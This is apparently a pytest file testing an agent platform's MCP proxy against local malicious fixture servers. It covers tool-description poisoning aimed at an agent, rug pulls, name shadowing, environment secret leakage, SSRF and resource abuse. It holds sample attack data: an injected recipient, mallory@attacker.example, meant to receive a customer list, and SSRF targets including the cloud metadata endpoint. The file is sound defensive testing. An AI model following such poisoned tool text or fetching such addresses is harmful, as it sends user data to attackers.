"""2.5a (MOCK): MCP servers through the AgentOS proxy, against malicious fixture servers.

All servers are local fixtures (agentos/tests/fixtures/mcp/), stdio or 127.0.0.1 only. No real model is
called. Every server started here is stopped and checked to be gone (no orphans).
T1 poisoning, T2 rug pull, T3 shadowing, T4 secret theft, T5 SSRF, T6 resource abuse, T7 server requests.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import os
import socket
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import pytest

from agentos.flows.labels import Label
from agentos.flows.models import EdgeDefinition, FlowDefinition, NodeDefinition
from agentos.flows.policy import SecurityPolicy
from agentos.flows.proxy import AgentOSToolProxy
from agentos.flows.rules import PinnedArgumentOverrideError, SinkRuleViolationError
from agentos.flows.static_analyzer import StaticFlowAnalyzer
from agentos.flows.tool_catalog import ToolCatalog, ToolLookupError, agent_initial_context
from agentos.mcp.catalog import (
    MCPNameError,
    canonical_name,
    merge_discovery,
    normalize_name,
    parse_name,
    target_fingerprint,
    tool_hash,
    tool_status,
    wire_name,
)
from agentos.mcp.env import MCPEnvError, build_child_env, provider_env_names, validate_env_names
from agentos.mcp.manager import MCPManager, MCPServerUnavailable, MCPTimeout, MCPToolChanged, server_run_id
from agentos.storage.file import open_file_storage
from agentos.storage.models import MCPServerRecord, MCPToolApproval

FIX = Path(__file__).parent / "fixtures" / "mcp"
FAKE_PROVIDER_VALUE = "fake-provider-key-for-env-test-0001"
FAKE_VAULT_VALUE = "fake-vault-secret-for-env-test-0002"


def pid_alive(pid: int | None) -> bool:
    if not pid:
        return False
    try:
        import psutil
    except ImportError:  # pragma: no cover
        psutil = None
    if psutil is not None:
        if not psutil.pid_exists(pid):
            return False
        try:
            return psutil.Process(pid).status() != psutil.STATUS_ZOMBIE
        except psutil.NoSuchProcess:
            return False
    if sys.platform == "win32":  # pragma: no cover
        import ctypes

        h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
        if not h:
            return False
        code = ctypes.c_ulong()
        ctypes.windll.kernel32.GetExitCodeProcess(h, ctypes.byref(code))
        ctypes.windll.kernel32.CloseHandle(h)
        return code.value == 259
    try:  # pragma: no cover
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def wait_dead(pid: int | None, timeout: float = 10.0) -> bool:
    end = time.time() + timeout
    while time.time() < end:
        if not pid_alive(pid):
            return True
        time.sleep(0.1)
    return not pid_alive(pid)


def record(name: str, script: str, *args: str, **kw) -> MCPServerRecord:
    return MCPServerRecord(name=name, transport="stdio", command=sys.executable,
                           args=[str(FIX / script), *args], enabled=True, **kw)


def approve(rec: MCPServerRecord, tool: str, side_effect: str = "read", **kw) -> MCPServerRecord:
    st = rec.tools[tool]
    ap = MCPToolApproval(approved_sha256=st.snapshot.sha256, target_fingerprint=target_fingerprint(rec),
                         side_effect=side_effect, **kw)
    tools = dict(rec.tools)
    tools[tool] = st.model_copy(update={"approval": ap})
    return rec.model_copy(update={"tools": tools})


@pytest.fixture
def storage(tmp_path):
    return open_file_storage(str(tmp_path / "project"), vault_path=str(tmp_path / "vault.json"))


@pytest.fixture
def manager(tmp_path, storage):
    return MCPManager(project_path=str(tmp_path / "project"), storage=storage, idle_timeout_s=0,
                      call_timeout_s=15, start_timeout_s=30)


async def server_events(storage, name: str) -> list[str]:
    return [e.type for e in await storage.events.list(server_run_id(name), after_seq=0)]


# ===================================================================== naming and hashing (T3 basics)

def test_names_normalise_namespace_and_never_shadow_builtins():
    assert normalize_name("Send-Email ") == "send_email"  # look-alikes collide with send_email
    with pytest.raises(MCPNameError):
        normalize_name("a__b")  # the wire separator
    with pytest.raises(MCPNameError):
        normalize_name("!!!")
    assert canonical_name("notes", "read") == "mcp.notes.read"
    assert wire_name("notes", "read") == "mcp__notes__read"
    assert parse_name("mcp.notes.read") == ("notes", "read") == parse_name("mcp__notes__read")
    assert parse_name("send_email") is None
    cat = ToolCatalog([])
    assert cat.resolve("send_email").is_mcp is False  # a bare name only ever resolves to the built-in
    with pytest.raises(ToolLookupError) as e:
        cat.resolve("mcp.notes.send_email")
    assert e.value.reason == "unknown"


def test_hash_covers_name_description_and_schema():
    h = tool_hash("t", "d", {"properties": {"a": {"type": "string"}}})
    assert h != tool_hash("t", "d2", {"properties": {"a": {"type": "string"}}})
    assert h != tool_hash("t", "d", {"properties": {"b": {"type": "string"}}})
    assert h != tool_hash("t2", "d", {"properties": {"a": {"type": "string"}}})


# ===================================================================== T4: minimal environment

def test_env_names_validation_refuses_agentos_and_provider_key_variables():
    some_provider_var = sorted(provider_env_names())[0]
    for bad in ({"AGENTOS_API_TOKEN": "x"}, {some_provider_var: "x"}, {"BAD=NAME": "x"}):
        with pytest.raises(MCPEnvError):
            validate_env_names(bad, {})
    with pytest.raises(MCPEnvError):
        validate_env_names({}, {"AGENTOS_MASTER_KEY": "vault_name"})
    validate_env_names({"NOTES_MODE": "x"}, {"SERVICE_TOKEN": "fake_vault_name"})


def test_child_env_is_built_from_scratch(tmp_path):
    parent = {"PATH": "/bin", "SYSTEMROOT": "C:\\Windows", "GROQ_API_KEY": FAKE_PROVIDER_VALUE,
              "AGENTOS_API_TOKEN": "tok", "AGENTOS_MASTER_KEY": "mk", "USERPROFILE": "C:\\Users\\real", "RANDOM": "1"}
    env, cwd = build_child_env("s", tmp_path, {"NOTES_MODE": "x"}, {"SERVICE_TOKEN": FAKE_VAULT_VALUE},
                               parent_env=parent, platform="win32")
    assert "GROQ_API_KEY" not in env and "RANDOM" not in env
    assert not any(k.startswith("AGENTOS_") for k in env)
    assert env["USERPROFILE"].startswith(str(tmp_path)) and env["TEMP"].startswith(str(tmp_path))
    assert env["NOTES_MODE"] == "x" and env["SERVICE_TOKEN"] == FAKE_VAULT_VALUE
    assert cwd == tmp_path / ".agentos" / "mcp" / "s"


@pytest.mark.asyncio
async def test_T4_stdio_server_sees_only_its_configured_environment(tmp_path, monkeypatch, storage):
    # Secrets that exist in the AgentOS process environment (as after export_vault_provider_keys)
    monkeypatch.setenv("GROQ_API_KEY", FAKE_PROVIDER_VALUE)
    monkeypatch.setenv("AGENTOS_API_TOKEN", "fake-api-token-0003")
    monkeypatch.setenv("AGENTOS_MASTER_KEY", "ZmFrZS1tYXN0ZXIta2V5LW5vdC1yZWFsLTAwMDAwMDA=")
    monkeypatch.setenv("SOME_UNRELATED_VAR", "should-not-leak")

    async def resolver(name: str) -> str:
        assert name == "fake_service_vault_name"  # only this server's own vault name is resolved
        return FAKE_VAULT_VALUE

    m = MCPManager(project_path=str(tmp_path / "project"), storage=storage, secret_resolver=resolver, idle_timeout_s=0)
    rec = record("envdump", "envdump.py", env={"NOTES_MODE": "demo"},
                 secret_env={"SERVICE_TOKEN": "fake_service_vault_name"})
    try:
        rec = approve(await m.discover(rec), "dump_env")
        res = await m.call_tool(rec, "dump_env", rec.tools["dump_env"].snapshot.sha256, {})
        dumped = json.loads(res.text)
        env = dumped["env"]
        names = {k.upper() for k in env}
        allowed = {"SYSTEMROOT", "WINDIR", "SYSTEMDRIVE", "COMSPEC", "PATH", "PATHEXT", "PROCESSOR_ARCHITECTURE",
                   "NUMBER_OF_PROCESSORS", "USERPROFILE", "HOME", "APPDATA", "LOCALAPPDATA", "TEMP", "TMP",
                   "TMPDIR", "LANG", "PYTHONIOENCODING", "PYTHONUTF8", "NOTES_MODE", "SERVICE_TOKEN",
                   # set by the OS / Python runtime for every child process, never copied from AgentOS:
                   "__PYVENV_LAUNCHER__", "LC_CTYPE", "PWD", "SHLVL", "_"}
        assert names <= allowed, f"unexpected variables: {sorted(names - allowed)}"
        assert not names & provider_env_names()
        assert not any(n.startswith("AGENTOS_") for n in names)
        blob = json.dumps(dumped)
        for leaked in (FAKE_PROVIDER_VALUE, "fake-api-token-0003", "should-not-leak"):
            assert leaked not in blob
        assert env["SERVICE_TOKEN"] == FAKE_VAULT_VALUE and env["NOTES_MODE"] == "demo"
        assert Path(dumped["cwd"]).resolve() == (tmp_path / "project" / ".agentos" / "mcp" / "envdump").resolve()
    finally:
        await m.stop_all()


# ===================================================================== T1: tool poisoning

@pytest.mark.asyncio
async def test_T1_poisoned_description_cannot_steer_a_sink_argument(tmp_path, storage, manager):
    try:
        rec = await manager.discover(record("poison", "poisoned.py"))
    finally:
        await manager.stop_all()
    assert "mallory@attacker.example" in rec.tools["send_report"].snapshot.description
    assert rec.tools["send_report"].snapshot.label == "untrusted"

    # Approved as external_send with the default rule: every argument requires trusted.
    rec_plain = approve(rec, "send_report", side_effect="external_send")
    rec_admin = approve(rec, "send_report", side_effect="external_send",
                        replacement_description="Send the weekly report to the address pinned in the flow.")
    name = "mcp.poison.send_report"

    class NeverCalled:
        async def call_tool(self, *a, **k):  # the sink must be blocked before any call
            raise AssertionError("MCP server must not be called")

    for rec_x, admin in ((rec_plain, False), (rec_admin, True)):
        cat = ToolCatalog([rec_x])
        entry = cat.resolve(name)
        start = agent_initial_context(Label.trusted(), [entry])
        # Without an admin description the model has read server text: the context starts untrusted.
        assert (start.integrity == "untrusted") is (not admin)

        # Static analyzer and runtime proxy agree, using the same catalog.
        # The agent receives no untrusted data (not the entrypoint, no inbound edges), so the only untrusted
        # input left is the server-written description.
        flow = FlowDefinition(id=f"t1_{admin}", entrypoint="start", nodes={
            "start": NodeDefinition(id="start", type="manual_trigger"),
            "agent": NodeDefinition(id="agent", type="agent", config={"role": "r", "tools": [name]}),
        }, edges=[])
        analyzer = StaticFlowAnalyzer(flow, tool_catalog=cat)
        # same starting context on both sides (no read tool attached, so nothing else joins in)
        assert analyzer._agent_context(flow.nodes["agent"], Label.trusted()).integrity == start.integrity
        res = analyzer.verify()
        assert res.is_valid is admin, res.violations
        if not admin:
            assert any("to" in v.target_arg for v in res.violations)
            proxy = AgentOSToolProxy(run_id="r_t1", agent_node_id="agent", storage=storage, policy=SecurityPolicy(),
                                     agent_input_label=start, tool_catalog=cat, mcp_manager=NeverCalled())
            with pytest.raises(SinkRuleViolationError):
                await proxy.invoke("agent", wire_name("poison", "send_report"),
                                   {"to": "mallory@attacker.example", "body": "customer list"})
            evs = [e.type for e in await storage.events.list("r_t1")]
            assert "tool_call_blocked" in evs and "sink_intent" not in evs

    # With an admin description the server's text (and its parameter descriptions) never reach the model.
    proxy = AgentOSToolProxy(run_id="r_t1_tool", agent_node_id="agent", storage=storage, policy=SecurityPolicy(),
                             tool_catalog=ToolCatalog([approve(rec, "lookup_customer",
                                                                replacement_description="Look up a customer.")]))
    wrapped = proxy.create_wrapped_tool("mcp.poison.lookup_customer")
    assert wrapped.name == "mcp__poison__lookup_customer"
    assert "mallory" not in wrapped.description
    assert "mallory" not in json.dumps(wrapped.args_schema.model_json_schema())


@pytest.mark.asyncio
async def test_T1_pinned_recipient_cannot_be_overridden(storage, manager):
    try:
        rec = approve(await manager.discover(record("poison", "poisoned.py")), "send_report",
                      side_effect="external_send", untrusted_ok_args=["body"])
        cat = ToolCatalog([rec])
        proxy = AgentOSToolProxy(run_id="r_t1_pin", agent_node_id="agent", storage=storage, policy=SecurityPolicy(),
                                 pinned_args={"mcp.poison.send_report.to": "oncall@corp.local"},
                                 agent_input_label=agent_initial_context(Label.trusted(), [cat.resolve("mcp.poison.send_report")]),
                                 tool_catalog=cat, mcp_manager=manager)
        with pytest.raises(PinnedArgumentOverrideError):
            await proxy.invoke("agent", "mcp__poison__send_report", {"to": "mallory@attacker.example", "body": "x"})
        out = await proxy.invoke("agent", "mcp__poison__send_report", {"body": "weekly report"})
        assert "oncall@corp.local" in out and "mallory" not in out
        types_ = [e.type for e in await storage.events.list("r_t1_pin")]
        assert types_.count("sink_intent") == 1 and types_.count("sink_committed") == 1
        assert "mcp_tool_call" in types_
    finally:
        await manager.stop_all()


# ===================================================================== T2: rug pull

@pytest.mark.asyncio
async def test_T2_rug_pull_blocks_the_tool_until_reviewed_again(storage, manager):
    try:
        rec = approve(await manager.discover(record("rug", "rugpull.py")), "weather")
        await storage.mcp_servers.put(rec)
        assert ToolCatalog([rec]).resolve("mcp.rug.weather").sha256 == rec.tools["weather"].snapshot.sha256
        await manager.stop_all()  # the next start serves a changed tool

        with pytest.raises(MCPToolChanged):
            await manager.call_tool(rec, "weather", rec.tools["weather"].snapshot.sha256, {"city": "Pune"})
        stored = await storage.mcp_servers.get("rug")
        assert tool_status(stored, stored.tools["weather"]) == "changed"
        assert "mcp_tool_changed" in await server_events(storage, "rug")

        cat2 = ToolCatalog([stored])
        with pytest.raises(ToolLookupError) as e:
            cat2.resolve("mcp.rug.weather")
        assert e.value.reason == "changed"
        flow = FlowDefinition(id="t2", entrypoint="agent", nodes={
            "agent": NodeDefinition(id="agent", type="agent", config={"role": "r", "tools": ["mcp.rug.weather"]}),
        }, edges=[])
        res = StaticFlowAnalyzer(flow, tool_catalog=cat2).verify()
        assert not res.is_valid and "changed" in res.violations[0].reason
    finally:
        await manager.stop_all()


def test_T2_changing_the_launch_target_invalidates_approvals():
    rec = MCPServerRecord(name="s", transport="stdio", command="python", args=["a.py"], enabled=True)
    tools, _ = merge_discovery(rec, [{"name": "t", "description": "d", "input_schema": {}}])
    rec = approve(rec.model_copy(update={"tools": tools}), "t")
    assert tool_status(rec, rec.tools["t"]) == "approved"
    moved = rec.model_copy(update={"args": ["b.py"]})
    assert tool_status(moved, moved.tools["t"]) == "changed"


# ===================================================================== T3: shadowing

@pytest.mark.asyncio
async def test_T3_shadowing_tools_are_namespaced_or_rejected(storage, manager):
    try:
        rec = await manager.discover(record("shadow", "shadow.py"), builtin_names=["send_email", "http_request"])
    finally:
        await manager.stop_all()
    # "send_email" and "Send-Email" collide after normalisation: both rejected
    assert "send_email" not in rec.tools
    assert "mcp_tool_name_rejected" in await server_events(storage, "shadow")
    # "http_request" exists only as mcp.shadow.http_request, with a warning; the built-in is unaffected
    assert rec.tools["http_request"].warnings
    cat = ToolCatalog([approve(rec, "http_request")])
    # 3.2 (0b): a bare "http_request" is a flow step, never an agent tool; the MCP tool stays namespaced
    with pytest.raises(ToolLookupError):
        cat.resolve("http_request")
    assert cat.resolve("mcp.shadow.http_request").is_mcp is True


# ===================================================================== T5: SSRF

@pytest.mark.asyncio
@pytest.mark.parametrize("url", [
    "http://127.0.0.1:9/mcp", "http://localhost:9/mcp", "http://10.0.0.5/mcp",
    "http://192.168.1.10/mcp", "http://169.254.169.254/latest/meta-data", "http://[::1]:9/mcp",
])
async def test_T5_blocked_addresses(tmp_path, url):
    from agentos.flows.net_guard import SSRFBlockedError

    m = MCPManager(project_path=str(tmp_path), idle_timeout_s=0,
                   resolver=lambda h, p: ["127.0.0.1"] if h == "localhost" else [h.strip("[]")])
    with pytest.raises(MCPServerUnavailable) as e:
        await m.discover(MCPServerRecord(name="h", transport="http", url=url, enabled=True))
    assert isinstance(e.value.__cause__, SSRFBlockedError)
    await m.stop_all()


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


@pytest.mark.asyncio
async def test_T5_allowlisted_local_http_server_works_and_redirects_are_refused(tmp_path):
    port = _free_port()
    proc = subprocess.Popen([sys.executable, str(FIX / "http_server.py"), str(port)],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, cwd=str(tmp_path))
    try:
        end = time.time() + 30
        while time.time() < end:
            try:
                socket.create_connection(("127.0.0.1", port), timeout=0.5).close()
                break
            except OSError:
                await asyncio.sleep(0.2)
        m = MCPManager(project_path=str(tmp_path), idle_timeout_s=0, url_allowlist=["127.0.0.1"])
        try:
            rec = await m.discover(MCPServerRecord(name="httpfix", transport="http",
                                                   url=f"http://127.0.0.1:{port}/mcp", enabled=True))
            rec = approve(rec, "echo")
            res = await m.call_tool(rec, "echo", rec.tools["echo"].snapshot.sha256, {"text": "hi"})
            assert res.text == "hi"
        finally:
            await m.stop_all()
    finally:
        proc.terminate()
        proc.wait(timeout=10)

    # A server that answers with a redirect to the metadata address: refused.
    class Redirect(BaseHTTPRequestHandler):
        def do_POST(self):  # noqa: N802
            self.send_response(307)
            self.send_header("Location", "http://169.254.169.254/latest/meta-data")
            self.send_header("Content-Length", "0")
            self.end_headers()

        do_GET = do_POST  # noqa: N815

        def log_message(self, *a):
            pass

    srv = HTTPServer(("127.0.0.1", 0), Redirect)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    m = MCPManager(project_path=str(tmp_path), idle_timeout_s=0, url_allowlist=["127.0.0.1"], start_timeout_s=10)
    try:
        with pytest.raises((MCPServerUnavailable, MCPTimeout)):
            await m.discover(MCPServerRecord(name="redir", transport="http",
                                             url=f"http://127.0.0.1:{srv.server_port}/mcp", enabled=True))
    finally:
        await m.stop_all()
        srv.shutdown()


def test_sse_is_refused(tmp_path):
    m = MCPManager(project_path=str(tmp_path), idle_timeout_s=0)
    rec = MCPServerRecord(name="old", transport="sse", url="http://127.0.0.1:1/sse", enabled=True)
    with pytest.raises(MCPServerUnavailable):
        asyncio.run(m.discover(rec))


# ===================================================================== T6: resource abuse

@pytest.mark.asyncio
async def test_T6_output_cap_and_slow_tool_timeout_kill(tmp_path, storage):
    m = MCPManager(project_path=str(tmp_path / "p"), storage=storage, idle_timeout_s=0, call_timeout_s=2,
                   max_output_bytes=1000)
    try:
        rec = await m.discover(record("abuse", "abuse.py"))
        for t in ("huge", "slow"):
            rec = approve(rec, t)
        res = await m.call_tool(rec, "huge", rec.tools["huge"].snapshot.sha256, {"n": 50_000})
        assert res.truncated and res.output_bytes == 50_000 and len(res.text.encode()) < 1100
        pid = m.pid("abuse")
        t0 = time.time()
        with pytest.raises(MCPTimeout):
            await m.call_tool(rec, "slow", rec.tools["slow"].snapshot.sha256, {"seconds": 30})
        assert time.time() - t0 < 15
        assert wait_dead(pid), "a server that hangs on a call is killed"
        assert not m.is_running("abuse")
    finally:
        await m.stop_all()


@pytest.mark.asyncio
async def test_T6_huge_single_message_is_cut_off(tmp_path):
    m = MCPManager(project_path=str(tmp_path), idle_timeout_s=0, call_timeout_s=3, max_message_bytes=200_000)
    try:
        rec = approve(await m.discover(record("abuse", "abuse.py")), "huge")
        pid = m.pid("abuse")
        # the reader stops at max_message_bytes; the call fails and the server is killed
        with pytest.raises((MCPTimeout, MCPServerUnavailable)):
            await m.call_tool(rec, "huge", rec.tools["huge"].snapshot.sha256, {"n": 5_000_000})
        assert wait_dead(pid)
        assert not m.is_running("abuse")
    finally:
        await m.stop_all()


@pytest.mark.asyncio
async def test_T6_server_that_never_answers_is_killed(tmp_path):
    seen: list = []
    m = MCPManager(project_path=str(tmp_path), idle_timeout_s=0, start_timeout_s=2)
    orig = m._transport

    def spy(record_, r, secrets):
        ctx = orig(record_, r, secrets)
        seen.append(r)
        return ctx

    m._transport = spy  # type: ignore[assignment]
    try:
        t0 = time.time()
        with pytest.raises((MCPTimeout, MCPServerUnavailable)):
            await m.discover(record("mute", "abuse.py", "--never-answer"))
        assert time.time() - t0 < 20
    finally:
        await m.stop_all()
    pids = [getattr(r.process, "pid", None) for r in seen]
    assert pids and all(wait_dead(p) for p in pids)


@pytest.mark.asyncio
async def test_T6_no_orphans_including_grandchildren(tmp_path):
    m = MCPManager(project_path=str(tmp_path), idle_timeout_s=0)
    server_pid = grandchild = None
    try:
        rec = approve(await m.discover(record("abuse", "abuse.py")), "spawn_child")
        server_pid = m.pid("abuse")
        res = await m.call_tool(rec, "spawn_child", rec.tools["spawn_child"].snapshot.sha256, {})
        grandchild = int(res.text)
        assert pid_alive(server_pid) and pid_alive(grandchild)
    finally:
        await m.stop_all()
    assert wait_dead(server_pid), "server process still running after stop_all"
    assert wait_dead(grandchild), "grandchild process orphaned after stop_all"


@pytest.mark.asyncio
async def test_T6_posix_group_kill_works_after_the_server_was_reaped(monkeypatch):
    """Regression (found on Linux CI): the SDK's POSIX kill calls os.getpgid(pid) first, which raises once the
    server has exited and been reaped, so the group (and a grandchild in it) was never signalled. The launcher
    signals the pgid recorded at spawn instead. Simulated here so it runs on every platform."""
    import signal as signal_mod

    from agentos.mcp import launcher

    class Proc:
        pid = 4242

    calls: list[tuple[int, int]] = []
    alive_checks = {"n": 0}

    def fake_killpg(pgid, sig):
        calls.append((pgid, sig))
        if sig == 0:
            alive_checks["n"] += 1
            if alive_checks["n"] > 2:  # the group empties after a couple of checks
                raise ProcessLookupError

    def no_getpgid(_pid):
        raise ProcessLookupError("reaped")  # what getpgid does after the server was reaped

    monkeypatch.setattr(launcher.sys, "platform", "linux")
    monkeypatch.setattr(launcher.os, "killpg", fake_killpg, raising=False)
    sigkill = getattr(signal_mod, "SIGKILL", 9)
    monkeypatch.setattr(launcher.signal, "SIGKILL", sigkill, raising=False)

    proc = Proc()
    monkeypatch.setattr(launcher.os, "getpgid", lambda pid: pid, raising=False)
    launcher._record_pgid(proc)  # at spawn: group leader of its own session
    monkeypatch.setattr(launcher.os, "getpgid", no_getpgid, raising=False)  # the server has since been reaped

    await launcher.kill_process_tree(proc, timeout_seconds=2.0)
    assert calls[0] == (4242, launcher.signal.SIGTERM)  # the recorded group, signalled directly
    assert (4242, 0) in calls and all(sig != sigkill for _, sig in calls)  # emptied: no SIGKILL needed

    # a group that never empties gets SIGKILL after the timeout; an already-empty group is fine
    calls.clear()
    monkeypatch.setattr(launcher.os, "killpg", lambda pgid, sig: calls.append((pgid, sig)), raising=False)
    await launcher._kill_posix_group(4242, timeout_seconds=0.2)
    assert calls[0] == (4242, launcher.signal.SIGTERM) and calls[-1] == (4242, sigkill)

    def gone(pgid, sig):
        raise ProcessLookupError

    monkeypatch.setattr(launcher.os, "killpg", gone, raising=False)
    await launcher._kill_posix_group(4242, timeout_seconds=0.2)  # no error

    # a server that is not the leader of its own group: fail closed (and kill it)
    killed: list[int] = []
    monkeypatch.setattr(launcher.os, "getpgid", lambda pid: 1, raising=False)
    monkeypatch.setattr(launcher.os, "kill", lambda pid, sig: killed.append(pid))
    with pytest.raises(RuntimeError, match="own session"):
        launcher._record_pgid(Proc())
    assert killed == [4242]


@pytest.mark.asyncio
async def test_idle_timeout_stops_the_server(tmp_path):
    m = MCPManager(project_path=str(tmp_path), idle_timeout_s=1)
    try:
        await m.discover(record("good", "good_tools.py"))
        pid = m.pid("good")
        assert pid_alive(pid)
        await asyncio.sleep(3)
        assert not m.is_running("good") and wait_dead(pid)
    finally:
        await m.stop_all()


# ===================================================================== T7: server-initiated requests

@pytest.mark.asyncio
async def test_T7_sampling_elicitation_roots_refused_and_recorded(storage, manager):
    try:
        rec = approve(await manager.discover(record("asker", "server_requests.py")), "ask_client")
        res = await manager.call_tool(rec, "ask_client", rec.tools["ask_client"].snapshot.sha256, {})
        out = json.loads(res.text)
        assert out["advertised"] == {"sampling": False, "elicitation": False, "roots": False}
        for k in ("sampling", "elicitation", "roots"):
            assert out[k].startswith("refused"), out
        evs = await storage.events.list(server_run_id("asker"))
        refused = sorted((e.data or {}).get("method") for e in evs if e.type == "mcp_server_request_refused")
        assert refused == ["elicitation/create", "roots/list", "sampling/createMessage"]
        # resources and prompts exist on this server but are never read: only tools were discovered
        assert set(rec.tools) == {"ask_client"}
    finally:
        await manager.stop_all()


# ===================================================================== review, publish, run time, intent/commit

@pytest.mark.asyncio
async def test_unreviewed_tool_refuses_publish_and_runtime_rejects_it(storage, manager):
    try:
        rec = await manager.discover(record("good", "good_tools.py"))
    finally:
        await manager.stop_all()
    cat = ToolCatalog([rec])
    flow = FlowDefinition(id="pub", entrypoint="agent", nodes={
        "agent": NodeDefinition(id="agent", type="agent", config={"role": "r", "tools": ["mcp.good.read_note"]}),
    }, edges=[])
    res = StaticFlowAnalyzer(flow, tool_catalog=cat).verify()
    assert not res.is_valid and "not been reviewed" in res.violations[0].reason

    proxy = AgentOSToolProxy(run_id="r_unrev", agent_node_id="agent", storage=storage, policy=SecurityPolicy(),
                             tool_catalog=cat, mcp_manager=manager)
    with pytest.raises(ValueError, match="not been reviewed"):
        await proxy.invoke("agent", "mcp__good__read_note", {})
    evs = await storage.events.list("r_unrev")
    assert evs[-1].type == "tool_call_rejected" and evs[-1].data["lookup"] == "unreviewed"

    # approved: publish passes and records the hash
    rec2 = approve(rec, "read_note")
    an = StaticFlowAnalyzer(flow, tool_catalog=ToolCatalog([rec2]))
    assert an.verify().is_valid
    assert an.summary()["mcp_tools"] == {"mcp.good.read_note": rec2.tools["read_note"].snapshot.sha256}


@pytest.mark.asyncio
async def test_write_tool_intent_commit_and_never_retried(storage, manager):
    try:
        rec = approve(await manager.discover(record("good", "good_tools.py")), "save_draft",
                      side_effect="write", untrusted_ok_args=["body"])
        cat = ToolCatalog([rec])
        pins = {"mcp.good.save_draft.to": "oncall@corp.local"}
        proxy = AgentOSToolProxy(run_id="r_ic", agent_node_id="agent", storage=storage, policy=SecurityPolicy(),
                                 pinned_args=pins, tool_catalog=cat, mcp_manager=manager)
        out = await proxy.invoke("agent", "mcp.good.save_draft", {"body": "hello"})
        assert "oncall@corp.local" in out
        evs = await storage.events.list("r_ic")
        types_ = [e.type for e in evs]
        assert types_.index("sink_intent") < types_.index("mcp_tool_call") < types_.index("sink_committed")
        call = next(e for e in evs if e.type == "mcp_tool_call")
        assert set(call.data) >= {"server", "tool", "duration_ms", "status", "output_bytes", "truncated"}
        assert "hello" not in json.dumps(call.data)  # no argument/output text in the call event
        # same call again in the same run: recorded result, no second call
        assert "already executed" in await proxy.invoke("agent", "mcp.good.save_draft", {"body": "hello"})

        # an intent without a commit (crash between intent and commit) is never retried
        proxy2 = AgentOSToolProxy(run_id="r_crash", agent_node_id="agent", storage=storage, policy=SecurityPolicy(),
                                  pinned_args=pins, tool_catalog=cat, mcp_manager=manager)
        args = {"body": "x", "to": "oncall@corp.local"}
        key = hashlib.sha256(
            f"r_crash:agent:mcp.good.save_draft:{json.dumps(args, sort_keys=True, separators=(',', ':'))}".encode()
        ).hexdigest()
        await storage.events.append(run_id="r_crash", type="sink_intent",
                                    data={"sink_node": "agent", "tool_name": "mcp.good.save_draft",
                                          "idempotency_key": key, "args": args})
        with pytest.raises(ValueError, match="uncommitted_sink_needs_review"):
            await proxy2.invoke("agent", "mcp.good.save_draft", {"body": "x"})
        assert not any(e.type == "mcp_tool_call" for e in await storage.events.list("r_crash"))
    finally:
        await manager.stop_all()


@pytest.mark.asyncio
async def test_run_fails_closed_when_hash_differs_from_publish(storage):
    from agentos.flows.engine import FlowEngine

    rec = MCPServerRecord(name="good", transport="stdio", command=sys.executable,
                          args=[str(FIX / "good_tools.py")], enabled=True)
    tools, _ = merge_discovery(rec, [{"name": "read_note", "description": "Read the latest note.", "input_schema": {}}])
    rec = approve(rec.model_copy(update={"tools": tools}), "read_note")
    await storage.mcp_servers.put(rec)
    flow = FlowDefinition(id="hashrun", entrypoint="start", nodes={
        "start": NodeDefinition(id="start", type="manual_trigger"),
        "agent": NodeDefinition(id="agent", type="agent", config={"role": "r", "tools": ["mcp.good.read_note"]}),
    }, edges=[EdgeDefinition(source="start", target="agent", arg_mapping={"task": "payload"})])
    engine = FlowEngine(flow=flow, storage=storage, policy=SecurityPolicy(),
                        expected_mcp_hashes={"mcp.good.read_note": "0" * 64})
    state = await engine.run(run_id="r_hash", inputs={"text": "hi"}, raise_on_error=False)
    assert str(getattr(state.status, "value", state.status)) == "failed"
    assert "mcp_tool_hash_mismatch" in [e.type for e in await storage.events.list("r_hash")]
